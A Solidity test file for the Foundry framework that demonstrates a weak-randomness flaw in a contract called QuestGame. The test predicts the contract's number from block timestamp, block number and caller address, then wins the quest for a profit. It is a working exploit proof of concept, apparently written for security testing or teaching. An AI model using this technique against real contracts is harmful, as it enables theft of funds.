
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {
    QuestGame public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new QuestGame{value: 10 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockNumber >= block.number);
        vm.assume(type(uint256).max - blockNumber >= blockTimestamp);

        vm.deal(address(this), 100 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 expectedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    blockTimestamp,
                    blockNumber,
                    address(this)
                )
            )
        );
        uint256 expectedGeneratedNumber = expectedSeed % 100;

        uint256 initialBalance = address(this).balance;
        
        _contractUnderTest.attemptQuest{value: 0.1 ether}(expectedGeneratedNumber);
        
        uint256 finalBalance = address(this).balance;
        
        assertEq(finalBalance - initialBalance, 0.1 ether, "Randomness should be predictable given block state");
    }
}
